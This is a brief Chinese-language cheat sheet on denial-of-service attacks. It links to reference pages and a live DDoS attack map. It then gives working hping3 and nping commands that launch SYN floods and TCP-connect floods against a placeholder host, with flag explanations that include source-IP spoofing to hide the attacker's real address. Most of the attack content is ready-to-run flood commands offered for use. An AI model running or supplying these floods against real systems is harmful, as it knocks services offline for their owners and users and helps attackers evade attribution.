# DOS vs DDoS

https://zh.wikipedia.org/wiki/阻斷服務攻擊

# DDoS即時攻擊分佈圖
```
http://www.digitalattackmap.com
```

# 使用hping3/nping施行DoS攻擊

http://topspeedsnail.com/user-nping-hping3-dos/

使用hping3進行DoS攻擊： hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source testsite.com

```
-c：發送資料包的個數
-d：每個資料包的大小
-S：發送SYN資料包
-w：TCP window大小
-p：目標埠，你可以指定任意埠
–flood：盡可能快的發送資料包
–rand-source：使用隨機的IP位址，目的機器看到一堆ip，不能定位你的實際IP；也可以使用-a或–spoof隱藏主機名稱 
```

簡單的SYN洪水攻擊：hping3 -S --flood -V testsite.com

TCP連接攻擊：nping --tcp-connect -rate=90000 -c 900000 -q testsite.com
